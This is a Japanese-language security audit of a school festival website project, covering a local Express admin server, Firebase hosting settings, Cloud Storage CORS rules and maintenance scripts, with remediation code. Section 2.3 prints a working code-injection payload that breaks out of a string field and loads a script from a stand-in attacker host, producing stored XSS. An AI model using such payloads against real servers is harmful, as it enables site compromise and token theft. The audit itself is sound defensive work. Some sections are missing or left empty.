## 2. ローカル管理サーバー (`admin-server.js` / `test-admin-server.js`) のセキュリティ分析

`admin-server.js`（および `test-admin-server.js`）は、マスターデータ（`main/data/data.js`）のローカル保存と編集 GUI（`main/admin_sync.html`）の提供を目的とした Express サーバーである。しかしながら、本コンポーネントは**極めて危険な設計・実装**となっており、単なる「ローカル開発用」と軽視できない甚大な脅威を抱えている。

### 2.1 待ち受けポート・バインドIPアドレスの不備（CWE-1327）

#### 脆弱性のメカニズム
`admin-server.js` の103行目:
```javascript
const port = 3001; // test-admin-server.js では 3009
...
app.listen(port, () => {
  console.log(`... Running at: http://localhost:${port}/admin_sync.html ...`);
});
```
Node.js の `http.Server.listen(port)` においてホストアドレスを省略した場合、**デフォルトで `0.0.0.0` (すべてのIPv4インターフェース) および `::` (すべてのIPv6インターフェース) にバインド**される。

#### 脅威シナリオ
1. 開発者または文化祭実行委員が、学校のWi-Fi（または準備室の同一LAN環境）に接続したPCで `npm run admin` を実行する。
2. 同一Wi-Fiネットワークに接続している生徒、来場者、あるいは悪意ある攻撃者がポートスキャン（`nmap -p 3001 192.168.x.0/24` 等）を実施する。
3. 攻撃者の端末から `http://<実行委員のPCのIP>:3001/admin_sync.html` が直接ブラウザで開かれ、同時に `POST http://<実行委員のPCのIP>:3001/api/save-data` に対するHTTPリクエストが直接送信可能となる。

---

### 2.2 認証・認可の完全欠落（CWE-306）

#### 脆弱性のメカニズム
`POST /api/save-data` エンドポイントには、セッショントークン、APIキー、署名、パスワード、Basic認証などの**認証・認可機構が一切存在しない**。
誰でも有効なJSONボディをPOSTするだけで、サーバー上の `main/data/data.js` を無条件に上書きできる。

---

### 2.3 任意コード挿入 (Code Injection) / Stored XSS / サプライチェーン攻撃（CWE-94 / CWE-79）

本監査において特定された**最悪レベルの脆弱性**である。

#### コード詳細分析
`admin-server.js` 25〜91行目:
```javascript
app.post("/api/save-data", (req, res) => {
  try {
    const { projectData, stageData } = req.body;
    ...
    let dataVersion = req.body.version;
    if (!dataVersion) {
      dataVersion = Date.now().toString();
    }
    ...
    const fileContent = `/**
 * Nanryosai 2026
 * ...
 */
...
// バージョン情報
const dataVersion = "${dataVersion}";

// 企画の名簿データ
const projectData = ${jsonData};

// ステージデータ
const stageData = ${stageDataString};
...
window.projectData = projectData;
window.stageData = stageData;
`;

    fs.writeFileSync(filePath, fileContent, "utf8");
    ...
```

#### 脆弱性の本質
- `req.body.version` は文字列として受け取られた後、**一切のバリデーションやサニタイズ（エスケープ）を経ずに、テンプレートリテラル `${dataVersion}` によって JavaScript ソースコード内に直接埋め込まれている**（2重引用符 `"` 内に展開）。
- もし攻撃者が `version` に二重引用符 `"` やセミコロン `;`、改行、任意のJavaScriptコードを含めた場合、**生成される `data.js` 内に任意のJavaScriptコードが注入（Code Injection）される**。

#### 攻撃シナリオ (Attack Scenario)
1. **攻撃リクエストの送信**:
   同一LAN上の攻撃者（または後述のCSRF攻撃）が、以下のペイロードを `http://<IP>:3001/api/save-data` に送信する。
   ```http
   POST /api/save-data HTTP/1.1
   Host: 192.168.1.50:3001
   Content-Type: application/json

   {
     "projectData": [],
     "stageData": [],
     "version": "\";\n(function(){ const s=document.createElement('script'); s.src='https://attacker.example.com/malicious.js'; document.head.appendChild(s); })();\n// "
   }
   ```
2. **生成される `main/data/data.js` の内容**:
   ```javascript
   // バージョン情報 (admin_syncで同期状態を確認するために使用)
   const dataVersion = "";
   (function(){ const s=document.createElement('script'); s.src='https://attacker.example.com/malicious.js'; document.head.appendChild(s); })();
   // ";
   ```
3. **影響の波及（サプライチェーン汚染）**:
   - 実行委員のPC上の `data.js` が汚染される。
   - 実行委員がローカルで動作確認した際、即座に悪意あるスクリプトがブラウザで実行され、管理者セッションやトークンが窃取される。
   - さらに、この改ざんされた `data.js` がGitにコミットされ、Firebase Hostingにデプロイされた場合、**南陵祭Webサイトを訪問した数千人の一般来場者・在校生のブラウザ上で一斉に攻撃者コードが実行される（大規模 Stored XSS / サプライチェーン攻撃の成立）**。

---

### 2.4 CORS・Origin検証の欠落による Localhost CSRF / DNS Rebinding（CWE-352 / CWE-346）

#### 脆弱性のメカニズム
- `admin-server.js` は CORS ミドルウェアを使用しておらず、`Origin` ヘッダーや `Referer` ヘッダーの検証も行っていない。
- `Host` ヘッダーの検証も存在しない。

#### 脅威シナリオ
1. 実行委員が `admin-server.js`（`localhost:3001`）を起動したまま、ブラウザで無関係な外部サイトや掲示板、SNSのリンクを閲覧する。
2. 攻撃者のWebページに仕込まれたJavaScriptが `fetch('http://localhost:3001/api/save-data', ...)` を実行する。
3. または、**DNS Rebinding 攻撃**（攻撃者ドメインのDNSレコードを短時間で `127.0.0.1` に解決させる手法）を用いることで、ブラウザの同一オリジンポリシー（SOP）を完全に回避し、ローカルサーバーに対して認証不要でペイロードを送り込む。
4. 実行委員が意図せず自身のローカル環境のマスターデータを改ざん・破壊される。

---

### 2.5 任意ファイル上書き・データ消失・ReDoSリスク（CWE-73 / CWE-1333）

1. **トランザクション・バックアップの欠如**:
   - `fs.writeFileSync(filePath, fileContent, "utf8");` は原稿ファイルをアトミック性なしに即時上書きする。
   - 異常終了や不正なリクエストが送られた場合、正本である `main/data/data.js` が破損・消失し、復旧不能となる（Gitの未コミット作業が全消去される）。
2. **正規表現による破滅的バックトラッキング (ReDoS)**:
   - 52行目:
     ```javascript
     const match = existingContent.match(/(?:const|let|var)\s+stageData\s*=\s*(\[[\s\S]*?\]);/);
     ```
   - 巨大な `data.js` や壊れたシンタックスが渡された場合、`[\s\S]*?` のバックトラッキングによって Node.js のイベントループがブロックされ、サーバーがDoS状態に陥る。

### 2.6 ローカル管理サーバーの推奨是正策 (Remediation)

#### 対策コード案 (`admin-server.js`)
```javascript
const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const app = express();
const port = 3001;

// 1. セッショントークン生成（起動ごとにランダム生成）
const ADMIN_API_TOKEN = process.env.ADMIN_SERVER_SECRET || crypto.randomBytes(32).toString("hex");
console.log(`[Admin Server Security] Token: ${ADMIN_API_TOKEN}`);

// 2. JSON解析制限
app.use(express.json({ limit: "5mb" }));

// 3. 厳格なホスト・オリジン・認証ミドルウェア
app.use((req, res, next) => {
  const host = req.headers.host;
  // 127.0.0.1 または localhost 以外からの Host ヘッダーを拒否 (DNS Rebinding 防御)
  if (!host || (!host.startsWith("localhost:") && !host.startsWith("127.0.0.1:"))) {
    return res.status(403).json({ error: "Access denied: Invalid Host header" });
  }

  // APIエンドポイントの防御
  if (req.path.startsWith("/api/")) {
    const origin = req.headers.origin;
    if (origin && origin !== `http://localhost:${port}` && origin !== `http://127.0.0.1:${port}`) {
      return res.status(403).json({ error: "Access denied: Invalid Origin" });
    }
    const authHeader = req.headers["x-admin-token"];
    if (authHeader !== ADMIN_API_TOKEN) {
      return res.status(401).json({ error: "Unauthorized: Invalid or missing x-admin-token" });
    }
  }
  next();
});

// 4. 安全なデータ保存API
app.post("/api/save-data", (req, res) => {
  try {
    const { projectData, stageData, version } = req.body;
    if (!Array.isArray(projectData) || !Array.isArray(stageData)) {
      return res.status(400).json({ error: "Invalid data structure: projectData and stageData must be arrays." });
    }

    // version を英数字・ハイフン・ドットのみに強制検証（コード注入の完全防止）
    const safeVersion = String(version || Date.now()).replace(/[^a-zA-Z0-9.\-_]/g, "");

    const filePath = path.join(__dirname, "main", "data", "data.js");
    const backupPath = path.join(__dirname, "main", "data", `data.backup.${Date.now()}.js`);

    // 安全な JSON シリアライズ（</script> 対策含む）
    const jsonProject = JSON.stringify(projectData, null, 2).replace(/</g, "\\u003c");
    const jsonStage = JSON.stringify(stageData, null, 2).replace(/</g, "\\u003c");

    const fileContent = `/**
 * Nanryosai 2026 Master Data
 * Version: ${safeVersion}
 * Last Modified: ${new Date().toISOString().split("T")[0]}
 * Author: Nanryosai 2026 Project Team (Auto-generated)
 */
console.log("data.js loading...");
const dataVersion = ${JSON.stringify(safeVersion)};
const projectData = ${jsonProject};
const stageData = ${jsonStage};

window.projectData = projectData;
window.stageData = stageData;
`;

    // 一時ファイル書き込み -> アトミックリネームによる破損防止
    if (fs.existsSync(filePath)) {
      fs.copyFileSync(filePath, backupPath); // 直前バックアップ
    }
    const tempPath = `${filePath}.tmp`;
    fs.writeFileSync(tempPath, fileContent, "utf8");
    fs.renameSync(tempPath, filePath);

    res.json({ message: "Success: data.js updated safely." });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. 127.0.0.1 のみにバインド (外部公開の物理的遮断)
app.listen(port, "127.0.0.1", () => {
  console.log(`[Admin Server] Bound strictly to http://127.0.0.1:${port}`);
});
```

## 3. Firebase Hosting & ホスティングインフラセキュリティ (`firebase.json`)

### 3.1 `firebase.json` における `"hosting"` セクションの完全欠落（CWE-1188）

#### 現状の設定 (`firebase.json`)
```json
{
  "firestore": {
    "database": "(default)",
    "location": "asia-northeast1",
    "rules": "firestore.rules",
    "indexes": "firestore.indexes.json"
  },
  "functions": [
    {
      "source": "functions",
      "codebase": "default",
      "disallowLegacyRuntimeConfig": true,
      "ignore": [
        "node_modules",
        ".git",
        "firebase-debug.log",
        "firebase-debug.*.log",
        "*.local"
      ]
    }
  ],
  "storage": {
    "rules": "storage.rules"
  }
}
```

#### 潜在的重大リスク
1. **意図しないファイル流出**:
   - `firebase.json` に `"hosting"` の定義が存在しないため、もし開発者が `firebase deploy` や `firebase init hosting` を誤った設定で実行した場合、**プロジェクトのルートディレクトリ全体が公開ディレクトリ（public）に指定される事故**が起きやすい。
   - ルート全体が公開された場合、`scripts/`（管理者スクリプト）、`functions/`（サーバーサイドロジック）、`admin-server.js`、`package.json`、ログファイル群がインターネット上に丸見えとなる。
2. **マルチサイトルーティングの不備**:
   - 来場者用（`main/`）と店舗用ポータル・POS（`pos/`）、管理用画面（`admin/`）の公開境界がホスティングレベルで明示されていない。

---

### 3.2 HTTPセキュリティヘッダーの未設定

Firebase Hosting では、`firebase.json` の `"headers"` 配下に明示的に設定しない限り、主要なセキュリティヘッダーはブラウザへ付与されない。現在の設定では**すべてのセキュリティヘッダーが欠落**している。

#### 欠落しているヘッダーと影響

| ヘッダー | 現状 | 発生する脅威・脆弱性 |
| :--- | :--- | :--- |
| **Content-Security-Policy (CSP)** | **未設定** | XSS脆弱性が発生した場合にインラインスクリプトや外部攻撃者サーバーへの通信（トークン持ち出し）を阻止できない。CDN経由の不正スクリプト読み込みを防げない。 |
| **Strict-Transport-Security (HSTS)** | **未設定** | 校内公衆Wi-Fi等でSSL Strip（HTTP強制ダウングレード攻撃）や中間者攻撃（MITM）を受け、Cookieや通信内容を傍受される。 |
| **X-Content-Type-Options** | **未設定** | `nosniff` が設定されていないため、ブラウザによるMIMEタイプスニッフィングが発生し、悪意ある画像・テキストがHTML/JSとして誤解釈・実行される。 |
| **X-Frame-Options** / `frame-ancestors` | **未設定** | `SAMEORIGIN` や `DENY` がないため、攻撃者の外部サイト上の `<iframe>` に `portal.html` や `login.html`、`mobile-order.html` を埋め込まれ、**クリックジャッキング（Clickjacking）攻撃**によって意図しない注文確定やボタン押下を誘導される。 |
| **Referrer-Policy** | **未設定** | 外部URLやCDNへのリクエスト時に完全なReferer URLが送信される。特に後述の `admin/venue.html?token=token_a8f3e2c9d1` のように**URLクエリパラメータにアクセストークンを含む運用をしている場合、外部サーバーへ認証トークンが漏洩する**。 |
| **Permissions-Policy** | **未設定** | 位置情報、カメラ、マイク等のハードウェア権限に対する宣言がなく、サードパーティスクリプトからの不正呼び出しリスクが残る。 |

---

### 3.3 キャッシュ制御（`Cache-Control`）の不備

1. **HTMLファイルの過剰キャッシュ**:
   - デフォルトのCDN設定では、HTMLファイルがブラウザやエッジキャッシュに長期間保持される場合がある。
   - バグ修正や緊急アラート（`system_alerts` による緊急停止等）を発令しても、来場者の端末が古いキャッシュを参照し続け、注文を継続しようとする不整合が発生する。
2. **静的アセットのキャッシュ効率不足**:
   - 一方で、画像（`images/*.webp`）や不変のCSS/JSライブラリに対して適切な `Cache-Control: public, max-age=31536000, immutable` が設定されていない場合、文化祭当日のアクセス集中（数万人規模のリクエスト）時にFirebase Hostingの転送量制限超過やレイテンシ悪化を引き起こす。

## 4. Cloud Storage CORS設定 (`cors.json`) のセキュリティ分析

### 4.1 過剰にオープンなワイルドカード許可（CWE-942）

#### 現状の設定 (`cors.json`)
```json
[
  {
    "origin": ["*"],
    "method": ["GET", "HEAD", "PUT", "POST", "DELETE", "OPTIONS"],
    "responseHeader": ["Content-Type", "Access-Control-Allow-Origin"],
    "maxAgeSeconds": 3600
  }
]
```

#### 脆弱性のメカニズムとリスク
1. **危険なHTTPメソッドの全オリジン開放**:
   - `GET` や `HEAD` は一般来場者のブラウザが商品画像（WebP）を表示するために全公開（`*`）が必要である。
   - しかし、**`PUT`, `POST`, `DELETE` という変更・破壊メソッドまでもが `origin: ["*"]` に含まれている**。
2. **クロスオリジン書き込み・削除要求の受理**:
   - 仮に攻撃者が細工した外部Webサイトを店舗管理者に開かせた場合、そのブラウザ上でセッションやクレデンシャルが悪用され、外部オリジンから直接 Firebase Storage API への `DELETE` や `PUT` リクエストをトリガーできる下地を与えている。
   - Storageセキュリティルール（`storage.rules`）が存在するとはいえ、CORSはブラウザレベルでの**第一防衛線（Defense-in-Depth）**であるべきであり、全開放は最小権限の原則（Principle of Least Privilege）に反する。

---

### 4.2 推奨される `cors.json` 構成案

読み取り専用ルールと、信頼済みドメインからの書き込みルールを明確に分離して定義する。

```json
[
  {
    "origin": ["*"],
    "method": ["GET", "HEAD"],
    "responseHeader": ["Content-Type", "Cache-Control", "ETag"],
    "maxAgeSeconds": 86400
  },
  {
    "origin": [
      "https://nanryosai-2026-a4091.web.app",
      "https://nanryosai-2026-a4091.firebaseapp.com",
      "http://localhost:5000",
      "http://127.0.0.1:5000"
    ],
    "method": ["PUT", "POST"],
    "responseHeader": ["Content-Type", "ETag"],
    "maxAgeSeconds": 3600
  }
]
```
> **適用コマンド**:
> `gsutil cors set cors.json gs://nanryosai-2026-a4091.firebasestorage.app`
> または Google Cloud Console の Storage 設定より適用。

## 6. 運用スクリプト群 (`scripts/`, ルート直下) の機密情報・運用リスク

本プロジェクトには多数の運用・データ移行スクリプトが存在するが、それらには**「本番データを一瞬で完全消去してしまう致命的バグ・設計不備」**および**「認証情報の平文露出」**が含まれている。

### 6.1 `scripts/cleanupAndSyncOfficialData.js` の破壊的リスク

#### コード分析 (18〜25行目)
```javascript
const configPath = process.env.USERPROFILE + '/.config/configstore/firebase-tools.json';
if (!fs.existsSync(configPath)) {
  console.error('firebase-tools.json not found at', configPath);
  process.exit(1);
}

const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
const token = config.tokens.access_token;
const projectId = 'nanryosai-2026-a4091';
```

#### 脆弱性と脅威
1. **開発者マシンのグローバルトークンの無防備な読み出し**:
   - Firebase CLI がマシン全体で保持している `firebase-tools.json` からOAuthアクセストークンを生で読み出し、REST APIの `Bearer` トークンとして直接使用している。
   - スクリプトがエラーでスタックトレースやログを出力した際、`token` が端末画面やログファイル、CI出力に露出する。
2. **本番環境への安全弁（ガード）の完全欠落**:
   - `npm run cleanup-sync` または `node scripts/cleanupAndSyncOfficialData.js` を誤って1回叩くだけで、**確認プロンプト（`Are you sure?`）が一切出ないまま、本番の `orders`, `items`, `counters`, `receipts`, および Cloud Storage 内の全画像が一瞬で完全消去（パージ）される**。
   - エミュレータ環境か本番環境かのチェックも存在せず、直接本番プロジェクト `nanryosai-2026-a4091` をハードコードして破壊的DELETEリクエストを連打する。文化祭当日に作業者が誤ってコマンドを実行した場合、復旧不可能な惨事となる。

### 6.2 `scripts/resetTestData.js` & `scripts/wipeAuthUsers.js` の運用リスク

1. **`wipeAuthUsers.js`**:
   - 実行されると、Firebase Auth に登録されている**全ユーザー（在校生、一般来場者、スーパー管理者を含む）を一括削除**する。

2. **`resetTestData.js`**:

### 6.3 `generate_hash.js` における機密平文露出と暗号強度不足（CWE-214 / CWE-916）

#### コード分析
```javascript
const args = process.argv.slice(2);
if (args.length === 0) {
  console.log("Usage: node generate_hash.js <password>");
  process.exit(1);
}
const password = args[0];
const { derivedKey, salt } = hashPassword(password);
console.log(`\n[Input Password]: ${password}`);
```

#### 脆弱性
1. **コマンドライン引数による平文露出 (CWE-214)**:
   - `node generate_hash.js mySecretPass` と実行すると、OSのプロセスリスト（`ps aux` やタスクマネージャー）に平文パスワードが露出する。
   - シェルのコマンド履歴（`~/.bash_history` や PowerShell の `ConsoleHost_history.txt`）に平文が永久保存される。
   - スクリプト自身が `console.log` で平文パスワードを標準出力にプリントしているため、ターミナルログやIDEの出力履歴に残存する。
2. **PBKDF2の反復回数（ストレッチング）不足 (CWE-916)**:
   - 15行目: `crypto.pbkdf2Sync(password, salt, 10000, 64, "sha512")`
   - **反復回数がわずか 10,000 回**。
   - **OWASP Password Storage Cheat Sheet の推奨基準**: PBKDF2-HMAC-SHA512 を使用する場合、**最低でも 210,000 回以上**の反復が必要とされている。10,000回は現代のGPUを用いた総当たり攻撃（Brute-force / Hashcat）に対して極めて脆弱であり、短時間でハッシュが破られる。

   - `setupVenueAdmin.js` のハードコードパスワードを排除し、環境変数または動的生成に変更。
